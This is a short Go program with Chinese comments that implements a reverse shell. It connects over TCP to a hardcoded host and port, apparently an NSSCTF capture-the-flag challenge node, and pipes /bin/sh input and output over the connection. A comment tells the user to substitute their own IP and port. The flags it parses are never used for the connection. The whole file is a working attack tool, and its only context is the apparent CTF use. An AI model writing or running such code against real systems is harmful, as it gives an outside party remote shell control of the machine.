package main

import (
	"flag"
	"fmt"
	"net"
	"os/exec"
)

var (
	ipaddr string
	port   string
	shell  string
)

func main() {
	flag.StringVar(&ipaddr, "ip", "node3.anna.nssctf.cn", "-ip ip地址")
	flag.StringVar(&port, "port", "28034", "-port 端口")
	flag.StringVar(&shell, "shell", "/bin/sh", "-shell cmd或者是/bin/sh")
	flag.Parse()
	ip_port := fmt.Sprintf("%v:%v", ipaddr, port)
	conn, err := net.Dial("tcp", "node3.anna.nssctf.cn:28034") // 替换为你的IP和端口
	if err != nil {
		fmt.Println("连接失败:", err)
		return
	}
	fmt.Println("连接成功")
	// 将连接的输入输出重定向到命令行标准输入输出
	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	// 启动命令行
	err = cmd.Start()
	if err != nil {
		fmt.Println("启动命令行失败:", err)
		return
	}
	fmt.Println("命令行已启动")
	// 等待命令行退出
	err = cmd.Wait()
	if err != nil {
		fmt.Println("命令行退出失败:", err)
		return
	}
	fmt.Println("命令行已退出")
}
